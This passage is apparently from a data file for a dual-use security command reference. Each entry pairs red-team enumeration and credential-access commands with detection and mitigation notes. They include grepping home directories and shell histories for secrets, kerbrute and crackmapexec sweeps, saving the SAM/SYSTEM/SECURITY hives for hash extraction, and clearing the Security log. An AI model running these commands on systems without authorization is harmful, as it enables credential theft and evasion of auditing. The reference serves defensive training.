 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1518"],
 detect:"Uninstall-registry / package-db reads; EDR discovery analytics.",
 mitigate:"Patch management; remove unused software.",
 code:{
  ps:`Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object DisplayName | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName`,
  mac:`ls /Applications; brew list --versions 2>/dev/null`,
  linux:`dpkg -l 2>/dev/null || rpm -qa`
 }},
{id:"enum-services-weak", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Weak service paths (Windows)",
 desc:"Services with unquoted paths containing spaces — a classic local privilege-escalation vector.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1574.009"],
 detect:"Enumeration of Win32_Service; abuse would show a service starting an unexpected binary.",
 mitigate:"Quote all service ImagePaths; restrict permissions on service dirs.",
 code:{
  ps:`Get-CimInstance Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' -and $_.PathName -notmatch 'Windows' } | Select-Object Name, PathName, StartName`
 }},
{id:"enum-sudo", level:"intermediate",requires:{"elevation":true},updated:"2026-07", cat:"Enumeration", title:"Sudo rights (Linux/macOS)",
 desc:"List what the current user may run via sudo — a top privilege-escalation path.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1033"],
 detect:"sudo -l invocation appears in auth logs / sudo logs.",
 mitigate:"Minimal, specific sudo rules; no NOPASSWD on shells/interpreters; monitor sudo logs.",
 code:{
  linux:`sudo -l 2>/dev/null`,
  mac:`sudo -l 2>/dev/null`
 }},
{id:"enum-suid", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"SUID / SGID binaries (Linux/macOS)",
 desc:"Find set-uid/set-gid binaries that may allow privilege escalation (check against GTFOBins).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1548.001"],
 detect:"A recursive find across the filesystem is visible to auditd (execve of find) and file-access telemetry.",
 mitigate:"Remove unnecessary SUID bits; monitor for new SUID files; mount noexec/nosuid where possible.",
 code:{
  linux:`find / -perm -4000 -type f 2>/dev/null; echo "-- SGID --"; find / -perm -2000 -type f 2>/dev/null`,
  mac:`find / -perm -4000 -type f 2>/dev/null`
 }},
{id:"enum-cred-hunt", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Hunt for stored credentials",
 desc:"Search common locations for secrets — key files, configs, and shell histories.",
 danger:"Authorized engagements only; may surface real secrets — handle per rules of engagement.",
 team:"red", tags:["enumeration","password"], attack:["T1552.001"],
 detect:"Bulk recursive reads/greps of home and config dirs; file-access spikes; EDR credential-access analytics.",
 mitigate:"Use a secrets manager; never store plaintext creds; restrict file permissions; clear histories.",
 code:{
  ps:`Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*.ppk,id_rsa,*.pem,unattend.xml -ErrorAction SilentlyContinue | Select-Object FullName`,
  linux:`grep -rIl -e password -e secret -e api_key /home /etc 2>/dev/null | head
ls -la ~/.aws ~/.ssh ~/.config 2>/dev/null; grep -Ei 'pass|token|key' ~/.*_history 2>/dev/null | head`,
  mac:`ls -la ~/.aws ~/.ssh 2>/dev/null; grep -Ei 'pass|token|key' ~/.*_history 2>/dev/null | head`
 }},
{id:"enum-av-edr", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Installed security products (Windows)",
 desc:"Identify AV/EDR present to understand monitoring before acting.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","detection"], attack:["T1518.001"],
 detect:"Queries to SecurityCenter2 / enumeration of security services can itself be an EDR signal.",
 mitigate:"Tamper protection on EDR; alert on security-product enumeration.",
 code:{
  ps:`Get-CimInstance -Namespace root/SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState
Get-Service | Where-Object { $_.DisplayName -match 'Defender|CrowdStrike|Carbon Black|SentinelOne|Cylance|Sophos|McAfee|Cortex' }`
 }},
{id:"enum-tokens", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Abusable privileges (Windows)",
 desc:"Check for privileges that enable escalation (SeImpersonate, SeDebug, SeBackup, etc.).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1134"],
 detect:"whoami /priv is low-signal; subsequent token abuse is the detectable event.",
 mitigate:"Minimize privilege assignments; monitor for token-manipulation behavior.",
 code:{
  ps:`whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeDebug SeBackup SeRestore SeTakeOwnership"`
 }},
{id:"enum-domain-native", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Native AD enumeration (domain-joined)",
 desc:"Enumerate the domain from a joined host using only built-in tools (no extra binaries).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","account"], attack:["T1087.002","T1482"],
 detect:"net.exe / nltest against a DC; spikes of SAMR/LDAP from a workstation.",
 mitigate:"Restrict anonymous/authenticated enumeration; monitor SAMR/LDAP; tiered admin.",
 code:{
  ps:`nltest /dclist:{{DOMAIN:example.com}}
net group "Domain Admins" /domain
net accounts /domain`,
  cmd:`nltest /dclist:{{DOMAIN:example.com}}
net group "Domain Admins" /domain`
 }},
{id:"enum-ldap", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"LDAP / AD enumeration (ldapsearch)",
 desc:"Query Active Directory over LDAP for users and attributes. Requires ldap-utils.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","ldap"], attack:["T1087.002"],
 detect:"High-volume LDAP queries from a non-admin host; DC 1644 verbose search logging.",
 mitigate:"Limit LDAP read scope; alert on bulk queries; LDAP signing/channel binding.",
 code:{
  linux:`ldapsearch -x -H ldap://{{DC:10.0.0.10}} -b "dc=example,dc=com" -D "{{USER:user@example.com}}" -w '{{PASS:}}' "(objectClass=user)" sAMAccountName`,
  mac:`ldapsearch -x -H ldap://{{DC:10.0.0.10}} -b "dc=example,dc=com" -D "{{USER:user@example.com}}" -w '{{PASS:}}' "(objectClass=user)" sAMAccountName`
 }},
{id:"enum-kerbrute", level:"intermediate",requires:{"tool":"kerbrute"},updated:"2026-07", cat:"Enumeration", title:"Kerberos username enumeration",
 desc:"Validate domain usernames via Kerberos pre-auth (AS-REQ) without triggering lockouts. Requires kerbrute.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","account"], attack:["T1087"],
 detect:"Many Kerberos 4768/4771 pre-auth failures for distinct usernames from one source.",
 mitigate:"Alert on 4768/4771 spikes; account-name hygiene; honeytokens.",
 code:{
  linux:`kerbrute userenum -d {{DOMAIN:example.com}} --dc {{DC:10.0.0.10}} {{WORDLIST:users.txt}}`
 }},
{id:"enum-smbmap", level:"intermediate",requires:{"tool":"smbmap"},updated:"2026-07", cat:"Enumeration", title:"SMB share access mapping",
 desc:"Enumerate reachable SMB shares and your access level across hosts. Requires smbmap (or crackmapexec).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","smb"], attack:["T1135"],
 detect:"Authenticated SMB tree connects across many hosts; Windows 5140 share access.",
 mitigate:"Least-privilege share ACLs; SMB signing; alert on wide share access.",
 code:{
  linux:`smbmap -H {{IP:10.0.0.5}} -u {{USER:guest}} -p ''   # or: crackmapexec smb {{TARGET:10.0.0.0/24}} --shares`,
  mac:`smbmap -H {{IP:10.0.0.5}} -u {{USER:guest}} -p ''`
 }},
{id:"enum-crackmapexec", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Multi-protocol enumeration (CME/NetExec)",
 desc:"Sweep SMB/LDAP/WinRM across a range for shares, users, and access. Requires crackmapexec/netexec.",
 danger:"Authorized engagements only; credential use can trigger lockouts.",
 team:"red", tags:["enumeration","smb","active-directory"], attack:["T1135","T1087"],
 detect:"Same credential authenticating to many hosts rapidly; 4624/4625 and 5140 bursts.",
 mitigate:"Lockout policy; MFA; alert on lateral auth patterns; LAPS.",
 code:{
  linux:`crackmapexec smb {{TARGET:10.0.0.0/24}} -u {{USER:user}} -p '{{PASS:}}' --shares --users`
 }},
{id:"enum-nfs", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"NFS exports",
 desc:"List NFS shares a host exports (often world-readable).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","network"], attack:["T1135"],
 detect:"showmount/RPC mountd queries in server logs.",
 mitigate:"Restrict exports by host; use Kerberos NFS; avoid no_root_squash.",
 code:{
  linux:`showmount -e {{IP:10.0.0.5}}`,
  mac:`showmount -e {{IP:10.0.0.5}}`
 }},
{id:"enum-passpol", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Password & lockout policy",
 desc:"Read the account policy to plan spraying without triggering lockouts.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","account"], attack:["T1201"],
 detect:"Policy reads are low-signal; the follow-on spray is the detectable event (4625 bursts).",
 mitigate:"Sensible lockout thresholds; MFA; alert on distributed auth failures.",
 code:{
  ps:`net accounts`,
  linux:`grep -E '^PASS_' /etc/login.defs; grep -h faillock /etc/pam.d/* 2>/dev/null | sort -u`,
  mac:`pwpolicy getaccountpolicies 2>/dev/null | tail -n +2`
 }},
{id:"enum-mounts", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Drives, mounts & mapped shares",
 desc:"Enumerate local volumes, removable media, and mapped network drives for data and pivots.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1120","T1135"],
 detect:"Low-signal; correlate with subsequent access to mapped/removable media.",
 mitigate:"Restrict removable media; least-privilege share mappings.",
 code:{
  ps:`Get-PSDrive -PSProvider FileSystem
Get-CimInstance Win32_MappedLogicalDisk | Select-Object Name, ProviderName`,
  mac:`mount; diskutil list`,
  linux:`mount; lsblk`
 }},
{id:"enum-history", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Shell history for secrets",
 desc:"Mine command history for credentials, tokens, and useful commands.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","password"], attack:["T1552.003"],
 detect:"Reads of history files; EDR credential-access analytics.",
 mitigate:"Disable/limit history for sensitive shells; never pass secrets on the command line.",
 code:{
  ps:`Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 200 | Select-String -Pattern 'pass|cred|token|-key|ConvertTo-SecureString'`,
  linux:`grep -Ei 'pass|token|secret|-key|curl .*-u ' ~/.bash_history ~/.zsh_history 2>/dev/null`,
  mac:`grep -Ei 'pass|token|secret|-key|curl .*-u ' ~/.zsh_history ~/.bash_history 2>/dev/null`
 }},

/* ================= EVENT LOGS ================= */
 {"id":"evt-winevent-list-logs","level":"intermediate","related":["evt-winevent-recent","evt-winevent-filterhashtable"],"cat":"Event Logs","title":"List event logs with record counts","desc":"Enumerate every Windows event log channel and how many records each holds.","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Where-Object RecordCount -gt 0 | Sort-Object RecordCount -Descending | Select-Object LogName, RecordCount, LastWriteTime"}},
 {"id":"evt-winevent-recent","level":"intermediate","cat":"Event Logs","title":"Read most recent events from a log","desc":"Pull the newest N entries from any channel for fast triage.","tags":["logs","windows","triage"],"code":{"ps":"Get-WinEvent -LogName System -MaxEvents 50 | Format-Table TimeCreated, Id, LevelDisplayName, ProviderName -AutoSize","cmd":"wevtutil qe System /c:50 /rd:true /f:text"}},
 {"id":"evt-winevent-filterhashtable","level":"intermediate","cat":"Event Logs","title":"Server-side filter with FilterHashtable","desc":"Fast, indexed query by log, event ID, level, and time window (filtering happens in the log service, not PowerShell).","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-{{DAYS:7}})} | Format-List TimeCreated, Id, Message"}},
 {"id":"evt-winevent-xpath","level":"intermediate","cat":"Event Logs","title":"Query events with XPath","desc":"Use XPath expressions for precise field-level filtering across data elements.","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -LogName Security -FilterXPath \"*[System[(EventID=4624)]] and *[EventData[Data[@Name='LogonType']='10']]\" -MaxEvents 20","cmd":"wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:20 /f:text"}},
 {"id":"evt-wevtutil-query","level":"intermediate","cat":"Event Logs","title":"Query a log with wevtutil (no PowerShell)","desc":"Native CMD log query, useful on hosts where PowerShell is restricted.","tags":["logs","windows","quick-win"],"code":{"cmd":"wevtutil qe Application /c:20 /rd:true /f:text /q:\"*[System[(Level=2)]]\""}},
 {"id":"evt-wevtutil-export","level":"intermediate","requires":{"elevation":true},"related":["evt-winevent-export-csv"],"cat":"Event Logs","title":"Export an event log to .evtx","desc":"Preserve a full channel to a portable .evtx file for offline analysis or evidence.","danger":"Reading the Security log requires administrator rights. Store exports on evidence media and preserve chain of custody.","tags":["logs","windows","forensics"],"code":{"cmd":"wevtutil epl Security C:\\evidence\\{{HOST:host}}-security.evtx","ps":"wevtutil epl Security \"C:\\evidence\\{{HOST:host}}-security.evtx\""}},
 {"id":"evt-wevtutil-clear","level":"intermediate","requires":{"elevation":true},"cat":"Event Logs","title":"Clear an event log (and back it up first)","desc":"Clears a channel; use /bu to archive to .evtx before wiping. Clearing generates event 1102/104.","danger":"Destroys log history and requires admin. Clearing Security logs is a classic anti-forensic action (T1070.001) and is itself audited as event 1102.","team":"blue","attack":["T1070.001"],"detect":"The clear operation writes Security 1102 (audit log cleared) or System 104 (log cleared) with the account that performed it.","mitigate":"Forward logs to a central SIEM/collector in real time so a local clear cannot erase the copy; alert on 1102/104.","tags":["logs","windows","incident-response"],"code":{"cmd":"wevtutil cl Security /bu:C:\\evidence\\security-preclear.evtx"}},
 {"id":"evt-winevent-failed-4625","level":"intermediate","requires":{"elevation":true},"related":["evt-winevent-lockout-4740","evt-winevent-process-4688"],"cat":"Event Logs","title":"Failed logons (Event 4625)","desc":"List failed authentication attempts; a burst signals password guessing or spraying.","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1110"],"detect":"Many 4625 events for one account (guessing) or one attempt each across many accounts (spraying); pivot on Sub Status code and source IP.","mitigate":"Enforce account lockout thresholds, MFA, and strong passwords; block/geo-fence exposed RDP and SMB.","tags":["logs","account","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)} | Group-Object {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object Count, Name"}},
 {"id":"evt-winevent-lockout-4740","level":"intermediate","requires":{"elevation":true},"cat":"Event Logs","title":"Account lockouts (Event 4740)","desc":"Show which accounts were locked out and from which source workstation.","danger":"Requires administrator rights on a domain controller / the auditing host.","team":"blue","attack":["T1110"],"detect":"Repeated 4740 for the same account, or many accounts locking simultaneously, indicates brute force or a stale credential looping.","mitigate":"Investigate the Caller Computer Name field; rotate exposed credentials; tune lockout policy to slow guessing without enabling DoS.","tags":["logs","account","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4740} -MaxEvents 50 | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-log-cleared-1102","level":"intermediate","requires":{"elevation":true},"related":["evt-winevent-service-7045","evt-winevent-scriptblock-4104"],"cat":"Event Logs","title":"Detect Security log clearing (Event 1102)","desc":"Find when the Security log was cleared and by whom (paired System event is 104).","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1070.001"],"detect":"Any 1102 (Security) or 104 (System) is high-signal: legitimate clears are rare, so treat unexplained ones as possible anti-forensics.","mitigate":"Ship logs off-host to a WEF collector or SIEM immediately; alert on 1102/104; restrict the 'Manage auditing and security log' right.","tags":["logs","windows","incident-response"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} | Format-List TimeCreated, Message; Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-service-7045","level":"intermediate","cat":"Event Logs","title":"New service installs (Event 7045)","desc":"List newly installed services; a common persistence and lateral-movement footprint.","team":"blue","attack":["T1543.003"],"detect":"7045 with a random/short service name, a binary in a temp/user path, or 'demand start' + LocalSystem is suspicious (e.g. PsExec drops PSEXESVC).","mitigate":"Baseline expected services; alert on service creation from unusual paths; restrict admin rights that allow service install.","tags":["logs","persistence","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-7)} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-scriptblock-4104","level":"intermediate","cat":"Event Logs","title":"PowerShell script block logging (Event 4104)","desc":"Read deobfuscated PowerShell captured by script block logging (Microsoft-Windows-PowerShell/Operational).","team":"blue","attack":["T1059.001"],"detect":"4104 records containing IEX, DownloadString, FromBase64String, -enc, or reflective load patterns indicate offensive tooling.","mitigate":"Enable script block and module logging via GPO; enforce Constrained Language Mode and application control (WDAC/AppLocker).","tags":["logs","detection","windows"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 40 | Where-Object { $_.Message -match 'FromBase64String|DownloadString|-enc' } | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-process-4688","level":"intermediate","requires":{"elevation":true},"cat":"Event Logs","title":"Process creation auditing (Event 4688)","desc":"List created processes with parent/child lineage. Requires 'Audit Process Creation' (and command-line auditing GPO for full args).","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1059"],"detect":"Suspicious parent/child chains (e.g. winword.exe or w3wp.exe spawning cmd.exe/powershell.exe) and living-off-the-land binaries surface here.","mitigate":"Enable process-creation and command-line auditing fleet-wide; forward to SIEM; layer Sysmon Event ID 1 for richer detail.","tags":["logs","process","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-6)} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-export-csv","level":"intermediate","cat":"Event Logs","title":"Export events to CSV for timelining","desc":"Flatten selected events to CSV for spreadsheet or SIEM ingestion and timeline building.","tags":["logs","timeline","windows"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4634} -MaxEvents 500 | Select-Object TimeCreated, Id, @{N='Msg';E={$_.Message -replace '\\r?\\n',' '}} | Export-Csv -NoTypeInformation -Path .\\logon-timeline.csv"}},
 {"id":"evt-journalctl-recent","level":"intermediate","related":["evt-journalctl-unit","evt-journalctl-failed-ssh"],"cat":"Event Logs","title":"Recent journald entries","desc":"Read the tail of the systemd journal without a pager for quick triage.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -n 100 --no-pager"}},
 {"id":"evt-journalctl-time","level":"intermediate","cat":"Event Logs","title":"Journald time-window filter","desc":"Bound journal output to a start/end time for incident timelining.","tags":["logs","linux","timeline"],"code":{"linux":"journalctl --since \"{{START:2026-07-01 00:00:00}}\" --until \"{{END:2026-07-02 00:00:00}}\" --no-pager"}},
 {"id":"evt-journalctl-unit","level":"intermediate","cat":"Event Logs","title":"Journald logs for one service","desc":"Show journal entries for a specific systemd unit.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -u {{UNIT:ssh.service}} -n 50 --no-pager"}},
 {"id":"evt-journalctl-boot-priority","level":"intermediate","cat":"Event Logs","title":"Errors from the current boot","desc":"Filter the journal by priority for this boot; list boots to target a previous session.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -b -p err --no-pager; journalctl --list-boots"}},
 {"id":"evt-journalctl-export-json","level":"intermediate","cat":"Event Logs","title":"Export journald as JSON","desc":"Emit structured journal records for parsing or SIEM ingestion.","tags":["logs","linux","forensics"],"code":{"linux":"journalctl -u {{UNIT:ssh.service}} --since today -o json --no-pager > journal-export.json"}},
 {"id":"evt-journalctl-failed-ssh","level":"intermediate","cat":"Event Logs","title":"Failed SSH logins from journald","desc":"Surface failed SSH authentications; a spike signals brute force or spraying.","team":"blue","attack":["T1110"],"detect":"Many 'Failed password' or 'Invalid user' lines from one source IP, or one attempt across many usernames, indicates credential attacks.","mitigate":"Deploy fail2ban/sshd MaxAuthTries, enforce key-only auth, and restrict SSH exposure with a firewall or bastion.","tags":["logs","linux","account"],"code":{"linux":"journalctl -u ssh.service --since \"-24h\" --no-pager | grep -aE 'Failed password|Invalid user'"}},
 {"id":"evt-login-history-last","level":"intermediate","requires":{"elevation":true},"cat":"Event Logs","title":"Login history from wtmp/btmp","desc":"Show successful (last) and failed (lastb, root) interactive logins. BSD and GNU last differ in count syntax.","danger":"lastb reads /var/log/btmp and requires root.","tags":["logs","account","cross-platform"],"code":{"linux":"last -a -n 20; sudo lastb -a -n 20","mac":"last -20"}},
 {"id":"evt-macos-log-show","level":"intermediate","cat":"Event Logs","title":"macOS unified log: time window","desc":"Query the macOS unified log over a recent interval with a predicate filter.","tags":["logs","macos","triage"],"code":{"mac":"log show --last {{WINDOW:1h}} --predicate 'process == \"{{PROCESS:sshd}}\"' --info"}},
 {"id":"evt-macos-log-stream","level":"intermediate","cat":"Event Logs","title":"macOS unified log: live stream","desc":"Tail the macOS unified log in real time, filtered by a predicate.","tags":["logs","macos","quick-win"],"code":{"mac":"log stream --predicate 'subsystem == \"{{SUBSYSTEM:com.apple.securityd}}\"' --level info"}},
 {"id":"evt-macos-log-sshd","level":"intermediate","cat":"Event Logs","title":"macOS failed SSH/auth in unified log","desc":"Inspect authentication activity in the macOS unified log for signs of guessing.","team":"blue","attack":["T1110"],"detect":"Repeated sshd 'Failed password'/'authentication failure' entries, or opendirectoryd auth failures, indicate password attacks against the Mac.","mitigate":"Disable Remote Login if unused, require SSH keys, enable the application firewall, and enroll the host in MDM logging/EDR.","tags":["logs","macos","account"],"code":{"mac":"log show --last 24h --predicate 'process == \"sshd\"' --info | grep -iE 'failed|invalid|authentication'"}},

/* ================= WINDOWS REGISTRY ================= */
 {"id":"reg-query-key","level":"intermediate","cat":"Windows Registry","title":"Query a registry key","desc":"Read all values under one key with built-in reg.exe or the PowerShell registry provider.","tags":["registry","windows","quick-win"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"","ps":"Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'"}},
 {"id":"reg-query-recursive","level":"intermediate","cat":"Windows Registry","title":"Recurse a subtree","desc":"Dump every subkey and value beneath a path (/s in reg.exe, -Recurse in PowerShell).","tags":["registry","windows","enumeration"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\{{VENDOR:Microsoft}}\" /s","ps":"Get-ChildItem -Path 'HKLM:\\SOFTWARE\\{{VENDOR:Microsoft}}' -Recurse -ErrorAction SilentlyContinue"}},
 {"id":"reg-search-data","level":"intermediate","cat":"Windows Registry","title":"Search for a string in the registry","desc":"Find keys, value names, or REG_SZ data matching a term across a hive with reg query /f.","tags":["registry","windows","recon"],"code":{"cmd":"reg query HKLM /f \"{{TERM:password}}\" /s /t REG_SZ"}},
 {"id":"reg-add-value","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Create or set a value","desc":"Write a value with reg add or New-ItemProperty (HKLM/HKCR need an elevated prompt).","danger":"Writes to the registry; HKLM changes require Administrator and can break configuration. Test in HKCU first.","tags":["registry","windows"],"code":{"cmd":"reg add \"HKCU\\Software\\{{APP:MyApp}}\" /v {{NAME:Setting}} /t REG_SZ /d \"{{DATA:value}}\" /f","ps":"New-Item -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Force | Out-Null; New-ItemProperty -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Name '{{NAME:Setting}}' -Value '{{DATA:value}}' -PropertyType String -Force"}},
 {"id":"reg-delete-value","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Delete a value or key","desc":"Remove a single value (/v) or an entire key with reg delete or Remove-ItemProperty.","danger":"Destructive and irreversible without a backup. Export the key first (reg export). HKLM deletions need Administrator.","tags":["registry","windows"],"code":{"cmd":"reg delete \"HKCU\\Software\\{{APP:MyApp}}\" /v {{NAME:Setting}} /f","ps":"Remove-ItemProperty -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Name '{{NAME:Setting}}'"}},
 {"id":"reg-ps-read-value","level":"intermediate","cat":"Windows Registry","title":"Read one value programmatically","desc":"Pull a single value into a variable via PowerShell or Python's stdlib winreg module (Windows only).","tags":["registry","windows","automation"],"code":{"ps":"(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName).ProductName","py":"import winreg\nk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion')\nval, _ = winreg.QueryValueEx(k, 'ProductName')\nprint(val)"}},
 {"id":"reg-ps-set-value","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Set a value with the PowerShell provider","desc":"Modify an existing value in place with Set-ItemProperty.","danger":"Overwrites live configuration. HKLM paths require an elevated session; confirm the type matches the existing value.","tags":["registry","windows","automation"],"code":{"ps":"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\{{PATH:image.jpg}}'"}},
 {"id":"reg-export","level":"intermediate","cat":"Windows Registry","title":"Export a key to a .reg file","desc":"Snapshot a key to a text .reg backup before editing (reg export, /y to overwrite).","tags":["registry","windows","backup"],"code":{"cmd":"reg export \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\run-backup.reg /y"}},
 {"id":"reg-import","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Import a .reg file","desc":"Merge a previously exported .reg file back into the registry with reg import.","danger":"Silently overwrites existing values with no confirmation. Inspect the .reg contents first; HKLM merges need Administrator.","tags":["registry","windows","recovery"],"code":{"cmd":"reg import C:\\run-backup.reg"}},
 {"id":"reg-save-hive","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Save a live hive to a binary file","desc":"Write a loaded key/hive to a binary .hiv snapshot with reg save (preserves ACLs and types).","danger":"Requires Administrator (SeBackupPrivilege). Store the binary snapshot securely; it may contain sensitive configuration.","tags":["registry","windows","backup","forensics"],"code":{"cmd":"reg save \"HKLM\\SOFTWARE\" C:\\SOFTWARE.hiv /y"}},
 {"id":"reg-dump-cred-hives","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Save SAM/SYSTEM/SECURITY hives","desc":"Copy the credential-bearing hives offline for secretsdump-style extraction (reg save).","team":"purple","danger":"AUTHORIZED USE ONLY. SAM+SYSTEM together enable offline local hash extraction. Requires Administrator; treat the files as live credentials.","attack":["T1003.002"],"detect":"reg.exe with SAM/SECURITY/SYSTEM arguments in Security 4688 / Sysmon Event ID 1 command lines; new .hiv/.save files; use of SeBackupPrivilege (4673/4674).","mitigate":"Restrict local Administrator, enable Credential Guard, monitor reg save against protected hives, and alert on any process opening \\Registry\\Machine\\SAM.","tags":["registry","windows","password","post-ex"],"code":{"cmd":"reg save HKLM\\SAM C:\\sam.save /y\nreg save HKLM\\SYSTEM C:\\system.save /y\nreg save HKLM\\SECURITY C:\\security.save /y"}},
 {"id":"reg-load-offline-hive","level":"intermediate","requires":{"elevation":true},"cat":"Windows Registry","title":"Mount an offline hive for analysis","desc":"Load a dead-box or captured hive file into a temporary key, then unload it (reg load/unload).","team":"blue","danger":"Requires Administrator. Always reg unload when finished; a stuck mount can lock the source file.","tags":["registry","windows","forensics","triage"],"code":{"cmd":"reg load HKLM\\Offline C:\\evidence\\SOFTWARE\nreg query \"HKLM\\Offline\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg unload HKLM\\Offline"}},
 {"id":"reg-run-keys","level":"intermediate","updated":"2026-07","cat":"Windows Registry","title":"Audit Run / RunOnce autostart keys","desc":"Enumerate the classic per-machine and per-user autorun keys for persistence.","team":"purple","danger":"AUTHORIZED USE ONLY. Reading is safe; adding an entry here establishes persistence and needs authorization.","attack":["T1547.001"],"detect":"Sysmon Event ID 13 (RegistryValueSet) on Run/RunOnce paths; Autoruns diffs; Security 4657 with registry auditing enabled.","mitigate":"Baseline expected autoruns, block untrusted binaries with WDAC/AppLocker, and alert on new values written to Run/RunOnce.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"","ps":"'HKLM:','HKCU:' | ForEach-Object { Get-ItemProperty \"$_\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue }"}},
